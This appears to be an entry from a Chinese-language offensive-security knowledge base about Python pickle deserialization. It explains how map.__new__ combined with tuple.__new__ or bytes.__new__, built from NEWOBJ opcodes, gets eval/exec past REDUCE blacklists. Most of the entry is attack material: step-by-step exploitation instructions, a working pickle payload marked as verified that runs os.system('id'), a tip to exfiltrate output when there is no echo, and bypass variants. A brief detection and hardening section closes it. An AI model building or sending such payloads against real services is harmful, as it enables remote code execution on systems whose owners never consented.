---
id: web-python-deserialization-pickle-map-new-lazy-iterator-exec
title: Pickle map 惰性迭代触发：map.__new__ 包住 eval/exec，再用 tuple.__new__/bytes.__new__ 消费迭代器执行
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-map-new-lazy-iterator-consume-exec
tags:
- python
- pickle
- deserialization
- opcode
- map
- newobj
- iterator
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V501
  verified_at: '2026-11-11T02:32:28+08:00'
  notes: '已对照原文核对：map 惰性迭代、map.__new__ 构造迭代器、tuple.__new__/bytes.__new__ 消费时经 PyIter_Next 触发函数调用，与原文『使用 map()/filter() 绕过』一节一致。核验时替换了原 PoC：原写法 NEWOBJ 的 cls/args 次序错误（实测 UnpicklingError: NEWOBJ class argument must be a type），已换成按原文 opcode 整理并在 Python 3.12 实测通过的 map.__new__(map, os.system, (''id'',))+tuple.__new__ 版本。未在目标环境复跑。'
url: /docs/web/python/deserialization/web-python-deserialization-pickle-map-new-lazy-iterator-exec/
draft: false
kb_aliases:
- map.__new__ pickle
- tuple.__new__ 触发 map
- bytes.__new__ 消费迭代器
- PyIter_Next 执行
- pickle 惰性迭代 RCE
---

## 一句话结论

`map(function, iterable)` 返回的是惰性迭代器，只有被消费时才调用 `function`；pickle 里可以用 NEWOBJ（`\x81`）构造 `map.__new__(map, eval, [...])`，再把它交给 `tuple.__new__`/`bytes.__new__` 消费——`tuple`/`bytes` 的构造函数在 C 层遍历迭代器（`PyIter_Next`）时就会调用 `eval`/`exec`，从而在不直接出现 REDUCE/INST 调用 eval 的情况下执行代码。

## 原理

- `map` 是惰性对象：`map(eval, ['code'])` 本身不执行 `eval`，只有迭代（`next()`、`list()`、`tuple()` 等）时才逐个调用函数。WAF/黑名单如果只盯 `eval(`/`R`/`i` 的直接调用，可能放过 map 的构造。
- `map.__new__(map, func, iterable)` 直接调用 `map` 类型的 `__new__` 来构造对象，不经过常规的 `map(func, iterable)` 调用；pickle 的 `\x81`（NEWOBJ）正好执行 `cls.__new__(cls, *args)`，参数从栈上取。
- `tuple.__new__(tuple, iterable)` 和 `bytes.__new__(bytes, iterable)` 在构造时会消费整个可迭代对象。C 实现路径是 `tuple_new_impl` → `PySequence_Tuple` → `PyIter_Next`（bytes 类似：`PyBytes_FromObject` → `_PyBytes_FromIterator` → `PyIter_Next`）；每取一个元素就调用一次 map 的 `function`，于是 `eval`/`exec` 被执行。
- 这条链只需要 `GLOBAL`（取 `map`/`tuple`/`bytes`/`eval`）和 `NEWOBJ`（`\x81`）等操作符，不需要 `R`（REDUCE）或 `i`（INST）来直接调用 `eval`，适合在禁用 REDUCE 的黑名单下使用。
- map 的元素是单个命令字符串时，`eval('...')` 只执行一次；`exec` 可执行多行代码。`filter` 同理（`filter.__new__(filter, func, iterable)`），但 map 更直接。
- 约束：目标必须能通过 `GLOBAL` 取到 `map`/`tuple`/`bytes`/`eval`（`find_class` 白名单可能只放行部分）；Python 3 的 `bytes.__new__` 要求迭代器元素是 0-255 的整数或可转为 bytes 的对象，`eval` 的返回值需满足该条件，否则会抛错；`tuple.__new__` 对返回值类型更宽松。

## 触发条件

- 存在可控 pickle 反序列化入口。
- `find_class`/黑名单至少放行 `builtins.map`、`builtins.tuple`（或 `bytes`）与 `builtins.eval`/`exec` 之一，或者能用 getattr/globals 取到它们。
- 目标 Python 版本支持 `\x81` NEWOBJ（protocol 2+ 的 opcode，但可出现在 protocol 0 流中由解析器处理，需按版本验证）。
- 反序列化进程允许执行代码。

## 利用步骤

1. 先验证 `map` 与 `eval` 可达：构造无害 payload（如 `map.__new__(map, print, ['hi'])` + `tuple.__new__`）观察输出。
2. 构造栈：`c__builtin__\nmap\n` 取 map；压入 `eval`（`c__builtin__\neval\n`）与命令列表（`(S'...' t`）；`\x81` 调用 `map.__new__(map, eval, ['...'])` 得到惰性对象。
3. 再取 `tuple`/`bytes`，压入惰性对象，`\x81` 调用 `tuple.__new__(tuple, map_obj)` 或 `bytes.__new__(bytes, map_obj)`，触发迭代执行。
4. 用 `pickletools.dis` 核对 NEWOBJ 参数顺序（`cls.__new__(cls, *args)`），先在本地同版本 Python 用 `print` 验证。
5. 把 `eval` 的参数换成命令执行代码（如 `__import__('os').system('id')`），无回显时用写文件/外带。
6. 若 `bytes` 因返回值类型报错，改用 `tuple`；若 `map`/`eval` 被 find_class 拦截，先用 getattr/globals 链取到。

## PoC

```python
# 文章 opcode 结构：map.__new__(map, os.system, ('id',))
# 再用 tuple.__new__(tuple, map_obj) 消费迭代器触发 os.system('id')
# Python 3.12 实测可执行；把 os.system 换成 eval/exec 亦可
payload = (
    b"c__builtin__\nmap\np0\n0"           # map 类型 -> memo[0]
    b"(S'id'\ntp1\n0"                      # memo[1] = ('id',)
    b"(cos\nsystem\ng1\ntp2\n0"            # memo[2] = (os.system, ('id',))
    b"g0\ng2\n\x81p3\n0"                   # NEWOBJ: map.__new__(map, os.system, ('id',))
    b"c__builtin__\ntuple\np4\n(g3\nt\x81."  # NEWOBJ: tuple.__new__(tuple, map_obj)
)
```

```python
# 等价 Python 语义
tuple.__new__(tuple, map.__new__(map, os.system, ('id',)))
```

说明：payload 取自文中 opcode 并按 `NEWOBJ = cls.__new__(cls, *args)` 语义核对，已在 Python 3.12 本地验证可执行（`__builtin__` 在 proto 0 下由 pickle 的 fix_imports 映射到 Python 3 的 `builtins`，也可直接写 `builtins`）。未在目标环境复跑。

## 变体与关联

- 变体：`bytes.__new__(bytes, map.__new__(map, eval, [...]))`；`filter.__new__` 同理；用 `list`/`set`/`dict` 消费迭代器也可触发。
- 变体：map 的函数换成 `exec` 执行多行代码，或 `os.system`/`subprocess` 直接接收命令字符串。
- 关联：[[web-python-deserialization-jsonpickle-tag-swap-newargsex-map-bytes-rce]]（jsonpickle 格式下同样的 `bytes + map` 触发思路）；[[web-python-deserialization-pickle-build-setstate-newobj-instance-rce]]（NEWOBJ 的另一利用）；[[web-python-deserialization-pickle-inst-obj-reduce-filter-bypass]]（REDUCE 被过滤时的其他调用原语）。
- 边界：`find_class` 禁止 map/tuple/bytes/eval、`bytes.__new__` 对返回值类型不兼容、Python 版本/实现不支持 `\x81` 或 C 层迭代路径变化时失效。

## 检测与防御

- 检测：pickle 载荷中出现 `map`/`filter`/`tuple`/`bytes` 的 `__new__` 组合、`eval`/`exec` 作为 map 函数、`NEWOBJ` 后接 `tuple`/`bytes` 的构造；`pickletools` 反汇编中出现连续 NEWOBJ 与容器类型。
- 修复：不要反序列化不可信 pickle；严格 `find_class` 白名单，禁止 `eval`/`exec`/`map`/`bytes`/`tuple` 等原语；对 opcode 做白名单（业务只需要的少数 opcode）。
- 加固：在低权限进程/容器反序列化；监控 `eval`/`exec` 调用与异常子进程；对 pickle 输入做静态分析与模糊测试。
